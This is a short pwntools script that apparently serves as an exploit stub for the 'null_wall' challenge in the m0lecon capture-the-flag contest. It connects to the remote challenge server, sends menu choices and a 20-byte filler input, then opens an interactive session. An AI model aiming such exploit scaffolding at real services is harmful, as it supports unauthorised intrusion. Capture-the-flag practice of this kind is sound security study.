from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('null_wall')
# r= e.process()
r = remote('nullwall.challs.m0lecon.it', 1337)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

r.sendline(b"1")
r.sendafter(b"thoughts: ", b"a"*20)
r.sendline(b"2")
r.interactive()
